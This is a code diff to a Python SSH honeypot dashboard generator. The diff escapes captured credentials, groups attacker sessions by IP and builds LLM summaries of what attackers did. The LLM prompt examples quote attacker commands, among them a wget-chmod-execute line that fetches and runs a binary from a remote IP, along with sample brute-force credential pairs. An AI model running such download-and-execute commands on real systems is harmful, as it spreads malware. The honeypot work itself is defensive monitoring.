@@ -449,7 +449,7 @@ def analyze_events(events, geo_cache):
                 ip_last_seen[ip] = ts
             u = e.get("username", "")
             p = e.get("password", "")
-            combo = f"{u}:{p}"
+            combo = f"{h(u)}:{h(p)}"
             ip_creds[ip].append(combo)
             cred_combos[combo] += 1
             if day_key:
@@ -476,7 +476,7 @@ def analyze_events(events, geo_cache):
                 ip_last_seen[ip] = ts
             u = e.get("username", "")
             p = e.get("password", "")
-            combo = f"{u}:{p}"
+            combo = f"{h(u)}:{h(p)}"
             ip_creds[ip].append(combo)
             cred_combos[combo] += 1
             session_success.add(session)
@@ -710,7 +710,7 @@ def llm_generate(prompt, model="qwen3:4b", temperature=0.5, max_tokens=30):
 
 
 def generate_greatest_hits(data):
-    """Generate attacker stories for the top attackers, with LLM + caching."""
+    """Generate attacker stories for top attackers, with per-session LLM summaries."""
     hits = []
     geo_cache = data.get("geo_cache", {})
     ip_creds = data.get("ip_creds", {})
@@ -724,22 +724,27 @@ def generate_greatest_hits(data):
         city = attacker.get("city", "")
         isp = attacker.get("isp", "Unknown")
 
-        cmds = []
+        # Collect per-session command lists
+        ip_sessions = []
         for s in data.get("successful_sessions", []):
             if s["ip"] == ip:
-                cmds.extend([c["cmd"] for c in s["commands"]])
+                ip_sessions.append(s)
+        
+        all_cmds = []
+        for s in ip_sessions:
+            all_cmds.extend([c["cmd"] for c in s["commands"]])
 
         creds = ip_creds.get(ip, [])
         creds_str = ", ".join(creds[:5]) if creds else "none captured"
 
-        cmd_hash = hashlib.md5(str(sorted(set(cmds))).encode()).hexdigest()[:8] if cmds else "nocmds"
+        cmd_hash = hashlib.md5(str(sorted(set(all_cmds))).encode()).hexdigest()[:8] if all_cmds else "nocmds"
         cache_key = f"gh_{ip}_{cmd_hash}"
         
         if cache_key in desc_cache:
             story = _cache_get(desc_cache, cache_key)
-        elif cmds:
+        elif all_cmds:
             key_cmds = set()
-            for cmd in cmds[:10]:
+            for cmd in all_cmds[:10]:
                 for part in re.split(r'[;|&]', cmd):
                     part = part.strip()
                     base = part.split()[0] if part.split() else ""
@@ -747,22 +752,23 @@ def generate_greatest_hits(data):
                     if base and base not in ("export", "echo", "2", "head", "cut", "awk", "sed", "grep", "tr"):
                         key_cmds.add(base)
             cmd_list = ", ".join(sorted(key_cmds)[:8])
+            session_info = f"{len(ip_sessions)} session{'s' if len(ip_sessions) != 1 else ''}"
             prompt = f"""SSH honeypot attacker summary. Explain what they did and WHY it matters. Be technical and specific.
 
-Attacker: 249 attempts, 84 commands. Ran: cat, dmidecode, free, lscpu, lspci, nproc, uname. From: Netherlands, DigitalOcean.
+Attacker: 249 attempts, 2 sessions, 84 commands. Ran: cat, dmidecode, free, lscpu, lspci, nproc, uname. From: Netherlands, DigitalOcean.
 \u2192 Persistent scanner from a cloud VPS. Full hardware audit (CPU, GPU, RAM, PCI devices) \u2014 profiling this box for cryptomining potential. 249 attempts shows automated tooling.
 
-Attacker: 12 attempts, 3 commands. Ran: wget, chmod, bash. From: China, Alibaba Cloud.
+Attacker: 12 attempts, 1 session, 3 commands. Ran: wget, chmod, bash. From: China, Alibaba Cloud.
 \u2192 Smash-and-grab: downloaded a remote script and executed it immediately. Likely deploying a cryptominer or botnet agent. No recon, straight to payload delivery.
 
-Attacker: 75 attempts, 0 commands. Credentials tried: ubuntu:temponly, slurm:111111, servidor:111111. From: Germany, Hetzner.
+Attacker: 75 attempts, 0 sessions, 0 commands. Credentials tried: ubuntu:temponly, slurm:111111, servidor:111111. From: Germany, Hetzner.
 \u2192 Pure credential brute-forcer. 75 attempts with service-specific passwords (slurm = HPC clusters, servidor = Portuguese for server). Scanning for misconfigured compute nodes.
 
-Attacker: {count} attempts, {len(cmds)} commands. Ran: {cmd_list}. Creds: {creds_str}. From: {country}, {isp}.
+Attacker: {count} attempts, {session_info}, {len(all_cmds)} commands. Ran: {cmd_list}. Creds: {creds_str}. From: {country}, {isp}.
 \u2192"""
             story = llm_generate(prompt, temperature=0.7, max_tokens=60)
             if not story or any(story.lower().startswith(p) for p in ["here", "i can", "we ", "okay", "the attacker", "this command", "this is", "let me", "it looks", "the user"]):
-                story = classify_commands_fast(cmds, ip)
+                story = classify_commands_fast(all_cmds, ip)
             if not story:
                 story = "Got in, poked around, ran some commands."
             desc_cache[cache_key] = story
@@ -794,7 +800,7 @@ Attacker: {count} attempts, {len(cmds)} commands. Ran: {cmd_list}. Creds: {creds
             if len(story) > 200:
                 story = story[:197].rsplit(" ", 1)[0] + "..."
         if not story:
-            story = f"Knocked {count} times from {country}. {'Got in and ran recon.' if cmds else 'Never made it past the door.'}"
+            story = f"Knocked {count} times from {country}. {'Got in and ran recon.' if all_cmds else 'Never made it past the door.'}"
 
         first = data.get("ip_first_seen", {}).get(ip, "")
         last = data.get("ip_last_seen", {}).get(ip, "")
@@ -826,7 +832,8 @@ Attacker: {count} attempts, {len(cmds)} commands. Ran: {cmd_list}. Creds: {creds
             "count": count,
             "flag": attacker.get("flag", "\U0001f3f4"),
             "story": story,
-            "cmds": len(cmds),
+            "cmds": len(all_cmds),
+            "sessions": len(ip_sessions),
             "time_range": time_range,
         })
 
@@ -910,74 +917,194 @@ def classify_commands_fast(cmds, ip=None):
     return None
 
 
-def generate_command_explanations(data):
-    """Generate explanations for commands in successful sessions."""
-    explained = []
-    desc_cache = load_cache()
+def generate_attacker_narratives(data):
+    """Generate ONE narrative per attacker IP, grouping all sessions and deduplicating commands."""
     geo_cache = data.get("geo_cache", {})
     ip_creds_map = data.get("ip_creds", {})
-    
-    llm_calls = 0
-    MAX_LLM_CALLS = 15
+    desc_cache = load_cache()
+
+    # Group successful sessions by IP
+    ip_sessions = defaultdict(list)
     for s in data.get("successful_sessions", []):
-        geo = geo_cache.get(s["ip"], {})
-        nick = generate_nickname(s["ip"], geo, ip_creds_map.get(s["ip"], []))
-        cmds = [c["cmd"] for c in s["commands"]]
-        creds_used = s.get("creds", "")
-        if not cmds:
-            continue
-        
-        cmd_str = "; ".join(cmds[:10])
-        cmd_hash = hashlib.md5(cmd_str.encode()).hexdigest()[:8]
-        cache_key = f"cmd_{s['ip']}_{cmd_hash}"
-        
-        if cache_key in desc_cache:
-            explanation = _cache_get(desc_cache, cache_key)
+        ip_sessions[s["ip"]].append(s)
+
+    if not ip_sessions:
+        return []
+
+    results = []
+    llm_calls = 0
+    MAX_LLM_CALLS = 10
+
+    for ip, sessions in ip_sessions.items():
+        geo = geo_cache.get(ip, {})
+        nick = generate_nickname(ip, geo, ip_creds_map.get(ip, []))
+        country = geo.get("country", "Unknown")
+        city = geo.get("city", "")
+        isp = geo.get("isp", "Unknown")
+        loc = f"{city}, {country}" if city else country
+
+        # Collect ALL commands across all sessions, preserving order of first appearance
+        all_cmds_ordered = []
+        cmd_counts = Counter()
+        seen_cmds = set()
+        all_creds = set()
+        first_ts = None
+        last_ts = None
+
+        for s in sessions:
+            if s.get("creds"):
+                all_creds.add(s["creds"])
+            for c in s["commands"]:
+                cmd = c["cmd"]
+                cmd_counts[cmd] += 1
+                if cmd not in seen_cmds:
+                    seen_cmds.add(cmd)
+                    all_cmds_ordered.append(cmd)
+                # Track time range
+                ts = c.get("ts", "")
+                if ts:
+                    if first_ts is None or ts < first_ts:
+                        first_ts = ts
+                    if last_ts is None or ts > last_ts:
+                        last_ts = ts
+
+        total_cmd_executions = sum(cmd_counts.values())
+        unique_cmd_count = len(all_cmds_ordered)
+        creds_str = ", ".join(sorted(all_creds)[:3]) or "unknown"
+
+        # Build cache key from IP + sorted unique commands
+        cmd_hash = hashlib.md5(str(sorted(seen_cmds)).encode()).hexdigest()[:8]
+        cache_key = f"atk_{ip}_{cmd_hash}"
+
+        cached = _cache_get(desc_cache, cache_key)
+        if cached:
+            narrative = cached
         else:
-            explanation = classify_commands_fast(cmds, s["ip"])
-            
-            if explanation is None:
+            # Build the narrative
+            # For simple cases (all same command), use a template
+            if unique_cmd_count == 0:
+                narrative = f"Logged in across {len(sessions)} sessions but ran no commands."
+            elif unique_cmd_count == 1 and any(
+                k in all_cmds_ordered[0].lower() for k in ["uname", "/bin/./uname"]
+            ):
+                narrative = f"Ran uname {total_cmd_executions}x across {len(sessions)} sessions — automated OS fingerprinting."
+            elif unique_cmd_count <= 3 and total_cmd_executions == unique_cmd_count:
+                # Few unique commands, each run once — use annotations
+                steps = []
+                for cmd in all_cmds_ordered:
+                    ann = annotate_command(cmd)
+                    if ann:
+                        steps.append(ann)
+                    else:
+                        # Use the command basename
+                        base = cmd.strip().split()[0].split("/")[-1] if cmd.strip() else "?"
+                        steps.append(base)
+                narrative = " → ".join(steps)
+            elif unique_cmd_count <= 6:
+                # Moderate complexity — build arrow chain from annotations
+                steps = []
+                for cmd in all_cmds_ordered:
+                    ann = annotate_command(cmd)
+                    if ann and ann not in steps:
+                        steps.append(ann)
+                    elif not ann:
+                        base = cmd.strip().split()[0].split("/")[-1] if cmd.strip() else "?"
+                        if base not in steps:
+                            steps.append(base)
+                # Add repetition note if significant
+                repeated = [(cmd, cnt) for cmd, cnt in cmd_counts.items() if cnt > 2]
+                narrative = " → ".join(steps)
+                if repeated:
+                    top_repeated = max(repeated, key=lambda x: x[1])
+                    ann = annotate_command(top_repeated[0]) or top_repeated[0].split()[0].split("/")[-1]
+                    narrative += f" (repeated {ann} {top_repeated[1]}x)"
+            else:
+                # Complex command set — use LLM
                 if llm_calls < MAX_LLM_CALLS:
                     llm_calls += 1
-                    country = geo.get("country", "Unknown")
-                    isp = geo.get("isp", "Unknown")
-                    prompt = f"""SSH honeypot session one-liner. Be specific and technical about what the attacker did.
+                    # Build deduplicated command summary for prompt
+                    cmd_summary_parts = []
+                    for cmd in all_cmds_ordered[:15]:
+                        count = cmd_counts[cmd]
+                        if count > 1:
+                            cmd_summary_parts.append(f"{cmd}  (x{count})")
+                        else:
+                            cmd_summary_parts.append(cmd)
+                    # Sanitize: truncate long commands and strip control characters
+                    cmd_summary_parts = [
+                        re.sub(r"[\x00-\x1f\x7f-\x9f]", "", part[:100])
+                        for part in cmd_summary_parts
+                    ]
+                    cmd_block = "\n".join(cmd_summary_parts)
 
-Session: root logged in, ran: uname -a; cat /proc/cpuinfo; free -m; df -h
-\u2192 Full system profiling: OS version, CPU specs, available RAM and disk. Evaluating this box as a cryptomining candidate.
+                    prompt = (
+                        "Summarize this SSH honeypot attacker's behavior as a short arrow-chain narrative. "
+                        "Use → to connect steps. Be specific and technical. No preamble, no quotes.\n\n"
+                        "Example: OS fingerprint via uname → full hardware audit (lscpu, dmidecode, free) → "
+                        "enumerated PCI devices → profiling for cryptomining potential\n\n"
+                        "Example: wget payload from C2 → chmod +x → executed binary → attempted persistence via crontab\n\n"
+                        f"Attacker: {nick} from {loc} ({isp})\n"
+                        f"Sessions: {len(sessions)}, Total commands: {total_cmd_executions}, "
+                        f"Unique commands: {unique_cmd_count}\n"
+                        f"Credentials: {creds_str}\n"
+                        f"Commands (deduplicated, in order):\n{cmd_block}\n\n"
+                        "Arrow-chain summary:"
+                    )
+                    narrative = llm_generate(prompt, temperature=0.5, max_tokens=80)
 
-Session: deploy logged in, ran: wget http://45.33.1.2/x86; chmod 777 x86; ./x86
-\u2192 Payload delivery: fetched and executed a binary from a C2 server. Likely a Mirai variant or cryptominer dropper.
+                    # Validate
+                    if not narrative or len(narrative) < 10 or any(
+                        narrative.lower().startswith(p) for p in [
+                            "here", "i can", "we ", "okay", "the attacker",
+                            "this is", "let me", "sure", "**"
+                        ]
+                    ):
+                        narrative = None
 
-Session: {creds_used} logged in, ran: {cmd_str}
-\u2192"""
-                    explanation = llm_generate(prompt, temperature=0.7, max_tokens=40)
-                    bad = False
-                    if not explanation or len(explanation) < 10:
-                        bad = True
-                    elif any(explanation.lower().startswith(p) for p in ["here", "i can", "we ", "okay", "the attacker", "this command", "this is", "let me", "it looks", "the user", "sure", "session", "payload:"]):
-                        bad = True
-                    elif any(x in explanation.lower() for x in ["honeypot", "127.0.0.1", "as an ai", "i apologize"]):
-                        bad = True
-                    elif len(explanation.split()) < 4:
-                        bad = True
-                    if bad:
-                        explanation = None
-                
-                if not explanation:
-                    explanation = "Got in, ran some commands, left."
-            
-            desc_cache[cache_key] = explanation
-        
-        explained.append({
+                if not narrative:
+                    # Fallback: build from annotations
+                    steps = []
+                    for cmd in all_cmds_ordered[:10]:
+                        ann = annotate_command(cmd)
+                        if ann and ann not in steps:
+                            steps.append(ann)
+                    narrative = " → ".join(steps) if steps else f"Ran {unique_cmd_count} unique commands across {len(sessions)} sessions."
+
+            # Clean up
+            narrative = narrative.strip('"').strip()
+            if len(narrative) > 300:
+                narrative = narrative[:297].rsplit(" ", 1)[0] + "..."
+
+            desc_cache[cache_key] = {
+                "text": narrative,
+                "_cached_at": datetime.now(timezone.utc).isoformat()
+            }
+
+        # Build the display commands: deduplicated with counts
+        display_cmds = []
+        for cmd in all_cmds_ordered:
+            count = cmd_counts[cmd]
+            display_cmds.append({"cmd": cmd, "count": count})
+
+        results.append({
+            "ip": ip,
             "nick": nick,
-            "ip": s["ip"],
-            "commands": s["commands"],
-            "explanation": explanation,
+            "loc": loc,
+            "sessions": len(sessions),
+            "total_cmds": total_cmd_executions,
+            "unique_cmds": unique_cmd_count,
+            "creds": creds_str,
+            "narrative": narrative,
+            "display_cmds": display_cmds,
+            "first_ts": first_ts,
+            "last_ts": last_ts,
         })
 
     save_cache(desc_cache)
-    return explained
+    return results
+
+
+
 
 
 def generate_html(data):
@@ -999,15 +1126,15 @@ def generate_html(data):
         greatest_hits_html += f"""
         <div class="hit-card">
             <div class="hit-nick" onclick="flyToAttacker('{hit['nick']}')">{hit['flag']} {hit['nick']}</div>
-            <div class="hit-stat">{hit['count']} attempts{' \u00b7 ' + str(hit['cmds']) + ' commands' if hit['cmds'] else ''}</div>
-            <div class="hit-story">{hit['story']}</div>
+            <div class="hit-stat">{hit['count']} attempts{' \u00b7 ' + str(hit.get('sessions', 0)) + ' sessions' if hit.get('sessions') else ''}{' \u00b7 ' + str(hit['cmds']) + ' cmds' if hit['cmds'] else ''}</div>
+            <div class="hit-story">{h(hit['story'])}</div>
             <div style="color:#555;font-size:0.75em;margin-top:4px;">\u23f0 {hit['time_range']}</div>
         </div>"""
     if not greatest_hits_html:
         greatest_hits_html = '<div style="color:#666;">No attackers to profile yet.</div>'
 
-    print("[*] Generating command explanations (LLM)...")
-    explained_sessions = generate_command_explanations(data)
+    print("[*] Generating attacker narratives...")
+    attacker_narratives = generate_attacker_narratives(data)
 
     leaderboard_rows = ""
     for i, a in enumerate(data["top_attackers"], 1):
@@ -1039,42 +1166,53 @@ def generate_html(data):
         </div>"""
 
     terminal_content = ""
-    if explained_sessions:
-        for s in explained_sessions:
-            geo = geo_cache.get(s["ip"], {})
-            nick = s["nick"]
-            city = geo.get("city", "")
-            country = geo.get("country", "Unknown")
-            loc = f"{city}, {country}" if city else country
-            first_ts_raw = s["commands"][0]["ts"] if s["commands"] else ""
-            if first_ts_raw:
+    if attacker_narratives:
+        for atk in attacker_narratives:
+            session_word = "session" if atk["sessions"] == 1 else "sessions"
+            cmd_word = "cmd" if atk["total_cmds"] == 1 else "cmds"
+            terminal_content += f'<div class="term-ip-group">'
+            terminal_content += (
+                f'<div class="term-ip-header">'
+                f'<span class="nick-link" onclick="flyToAttacker(&quot;{atk["nick"]}&quot;)">'
+                f'\U0001f3ad {atk["nick"]}</span> ({atk["ip"]}) '
+                f'\u2014 {atk["loc"]} \u00b7 {atk["sessions"]} {session_word} '
+                f'\u00b7 {atk["total_cmds"]} {cmd_word}</div>'
+            )
+            terminal_content += '<div class="session-block">'
+            # Time range
+            time_parts = []
+            if atk.get("first_ts"):
                 try:
-                    utc_dt = datetime.fromisoformat(first_ts_raw.replace("Z", "+00:00")[:26]).replace(tzinfo=timezone.utc)
+                    utc_dt = datetime.fromisoformat(atk["first_ts"].replace("Z", "+00:00")[:26]).replace(tzinfo=timezone.utc)
                     local_dt = utc_dt.astimezone(ZoneInfo("America/New_York"))
-                    first_ts = local_dt.strftime("%Y-%m-%d %H:%M %Z")
+                    time_parts.append(local_dt.strftime("%Y-%m-%d %H:%M %Z"))
                 except (ValueError, TypeError):
-                    first_ts = first_ts_raw[:16].replace("T", " ")
-            else:
-                first_ts = ""
-            terminal_content += f'<div class="term-header">\U0001f3ad <span class="nick-link" onclick="flyToAttacker(&quot;{nick}&quot;)">{nick}</span> ({s["ip"]}) \u2014 {loc} <span style="color:#555;font-size:0.85em">\u00b7 {first_ts}</span></div>\n'
-            terminal_content += f'<div class="term-line" style="color:#ff9944;font-style:italic;">\U0001f4a1 {s["explanation"]}</div>\n'
-            for cmd in s["commands"]:
-                annotation = annotate_command(cmd["cmd"])
-                note_html = f' <span class="cmd-note">// {annotation}</span>' if annotation else ''
-                terminal_content += f'<div class="term-line"><span class="term-prompt">{h(nick)}@honeypot:~$ </span>{h(cmd["cmd"])}{note_html}</div>\n'
+                    time_parts.append(atk["first_ts"][:16].replace("T", " "))
+            if atk.get("creds"):
+                time_parts.append(f'as {atk["creds"]}')
+            meta = " \u00b7 ".join(time_parts)
+            if meta:
+                terminal_content += f'<div class="session-meta">{meta}</div>'
+            terminal_content += f'<div class="session-narrative">{h(atk["narrative"])}</div>'
+            # Show deduplicated commands with counts
+            if atk.get("display_cmds"):
+                terminal_content += '<div class="session-cmds">'
+                for dc in atk["display_cmds"]:
+                    count_badge = f' <span class="cmd-count">\u00d7{dc["count"]}</span>' if dc["count"] > 1 else ""
+                    annotation = annotate_command(dc["cmd"])
+                    note_html = f' <span class="cmd-note">// {annotation}</span>' if annotation else ""
+                    terminal_content += f'<div class="cmd-line"><span class="cmd-prompt">$</span> {h(dc["cmd"])}{count_badge}{note_html}</div>'
+                terminal_content += '</div>'
+            terminal_content += '</div></div>'
     elif data["successful_sessions"]:
         for s in data["successful_sessions"]:
             geo = geo_cache.get(s["ip"], {})
             nick = generate_nickname(s["ip"], geo, ip_creds.get(s["ip"], []))
-            city = geo.get("city", "")
-            country = geo.get("country", "Unknown")
-            loc = f"{city}, {country}" if city else country
-            terminal_content += f'<div class="term-header">\U0001f3ad <span class="nick-link" onclick="flyToAttacker(&quot;{nick}&quot;)">{nick}</span> ({s["ip"]}) \u2014 {loc}</div>\n'
+            terminal_content += f'<div class="term-header">\U0001f3ad {nick} ({s["ip"]})</div>'
             for cmd in s["commands"]:
-                ts_short = cmd["ts"][:19].replace("T", " ") if cmd["ts"] else ""
                 annotation = annotate_command(cmd["cmd"])
-                note_html = f' <span class="cmd-note">// {annotation}</span>' if annotation else ''
-                terminal_content += f'<div class="term-line"><span class="term-prompt">{h(nick)}@honeypot:~$ </span>{h(cmd["cmd"])}{note_html}</div>\n'
+                note_html = f' <span class="cmd-note">// {annotation}</span>' if annotation else ""
+                terminal_content += f'<div class="term-line"><span class="term-prompt">$ </span>{h(cmd["cmd"])}{note_html}</div>'
     else:
         terminal_content = '<div class="term-line" style="color:#666;">No successful logins captured yet. The bots are still trying...</div>'
 
@@ -1485,6 +1623,48 @@ def generate_html(data):
     .grid {{ gap: 10px; margin-bottom: 10px; }}
     .grid.full {{ max-width: 100%; }}
   }}
+
+  .term-ip-group {{
+    margin-bottom: 16px;
+    border-bottom: 1px solid #1a3a1a;
+    padding-bottom: 12px;
+  }}
+  .term-ip-header {{
+    color: #ff6b6b;
+    font-weight: bold;
+    font-size: 1.05em;
+    margin-bottom: 8px;
+    padding-bottom: 4px;
+    cursor: pointer;
+  }}
+  .session-block {{
+    margin: 4px 0 4px 12px;
+    padding: 4px 12px;
+    border-left: 2px solid #1a3a1a;
+  }}
+  .session-meta {{
+    color: #555;
+    font-size: 0.8em;
+    margin-bottom: 4px;
+  }}
+  .session-narrative {{
+    color: #ff8c00;
+    font-size: 0.85em;
+    font-style: italic;
+    line-height: 1.4;
+  }}
+  .session-cmds {{
+    color: #00ff41;
+    font-size: 0.82em;
+    margin-top: 4px;
+    line-height: 1.5;
+  }}
+  .session-cmds .cmd-line {{
+    margin: 1px 0;
+  }}
+  .session-cmds .cmd-prompt {{
+    color: #888;
+  }}
 </style>
 </head>
 <body>
@@ -1796,7 +1976,7 @@ def generate_html(data):
     allDailyBreakdown.forEach(function(d) {{
       if (d.date >= startStr && d.date <= endStr) {{
         var attackerCell = d.top_attacker_ip
-          ? '<span class="nick-link" onclick="flyToAttacker(\'' + d.top_attacker_nick + '\')">' + d.top_attacker_nick + '</span> <span style="color:#555">(' + d.top_attacker_ip + ')</span>'
+          ? '<span class="nick-link" onclick="flyToAttacker(&quot;' + d.top_attacker_nick + '&quot;)">' + d.top_attacker_nick + '</span> <span style="color:#555">(' + d.top_attacker_ip + ')</span>'
           : '<span style="color:#555">\u2014</span>';
         html += '<tr><td class="glow">' + d.date + '</td><td>' + d.sessions + '</td><td class="hide-mobile">' + d.login_attempts + '</td><td>' + d.successful + '</td><td>' + d.unique_ips + '</td><td class="hide-mobile">' + d.commands + '</td><td class="hide-mobile">' + attackerCell + '</td></tr>';
       }}
@@ -1909,6 +2089,7 @@ def generate_html(data):
       }}
     }}
   }});
+
 </script>
 
 </body>
